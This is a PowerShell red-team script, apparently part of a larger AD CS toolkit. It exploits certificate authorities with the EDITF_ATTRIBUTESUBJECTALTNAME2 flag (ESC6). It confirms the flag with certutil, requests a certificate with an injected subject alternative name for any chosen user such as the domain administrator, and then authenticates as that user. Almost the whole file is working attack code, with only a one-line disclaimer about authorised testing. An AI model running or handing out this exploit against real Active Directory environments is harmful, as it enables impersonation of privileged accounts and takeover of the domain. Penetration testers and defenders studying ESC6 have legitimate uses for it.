<#
.SYNOPSIS
    AD CS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag (LOLBAS).
.DESCRIPTION
    Exploits CAs with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.
    Injects a SAN via the -attrib flag on certreq to impersonate any user.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Any enrollable template with Client Auth EKU
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC6.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "User" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC6 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC6" "EDITF_ATTRIBUTESUBJECTALTNAME2 Flag"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Checking CA edit flags on $CAConfig..." -ForegroundColor Gray
$flags = certutil -config $CAConfig -getreg policy\EditFlags 2>$null
if ($flags -notmatch 'EDITF_ATTRIBUTESUBJECTALTNAME2') {
    Write-Host "    [-] Flag NOT enabled - ESC6 not exploitable on this CA" -ForegroundColor Red
    Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
}
Write-Host "    [+] EDITF_ATTRIBUTESUBJECTALTNAME2 CONFIRMED" -ForegroundColor Green
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

Write-Stage -Number 2 -Name "POSITIONING" -Status 'SKIPPED'

# STAGE 3: REQUEST with SAN via -attrib
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST (SAN via -attrib)"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -Template $TemplateName `
    -OutFile "$OutputDir\esc6.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc6" `
    -Attrib "SAN:upn=$TargetUPN"
if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
$certDump = certutil -dump $result.CerFile 2>$null
$sanLine = $certDump | Select-String 'Principal Name=' | Select-Object -First 1
if ($sanLine) { Write-Host "    [+] SAN: $($sanLine.Line.Trim())" -ForegroundColor Green }
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
